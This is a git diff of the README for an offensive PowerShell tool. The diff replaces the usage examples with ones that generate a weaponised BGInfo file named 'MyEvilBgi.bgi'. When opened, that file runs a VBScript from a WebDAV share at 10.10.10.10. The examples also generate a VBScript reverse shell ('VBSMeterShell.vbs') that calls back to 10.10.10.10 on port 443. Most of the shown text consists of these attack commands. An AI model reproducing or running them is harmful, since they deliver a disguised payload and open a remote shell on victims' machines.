@@ -4,13 +4,8 @@ Thanks to Cn33liz - @Cneelis for VBSWebMeter.
 
 How to use the functions:
 
-# Example 1
-New-BGIFile -FileName "StartCMD.bgi" -Script "StartCMD.vbs" -OutFilePath "C:\BGIPayload"
+## Example ##
+This example will generate a file called MyEvilBgi.bgi and VBSMeterShell.vbs inside the c:\BGIPayload folder. The BGI file will try to execute \\10.10.10.10\webdav\VBSMeterShell.vbs when opened. 
 
-# Example 2
-New-BGIFile -FileName "MyPayload.bgi" -Script "\\10.10.10.10\webdav\VBSMeterShell.vbs" -OutFilePath "C:\BGIPayload"
-
-# Example 3
+New-BGIFile -FileName "MyEvilBgi.bgi" -Script "\\10.10.10.10\webdav\VBSMeterShell.vbs" -OutFilePath "C:\BGIPayload"
 New-VBSWebMeter -RHOST "10.10.10.10" -RPORT "443" -HTTPS "Yes" -OutFilePath "C:\BGIPayload" -OutFile "VBSMeterShell.vbs"
-
-
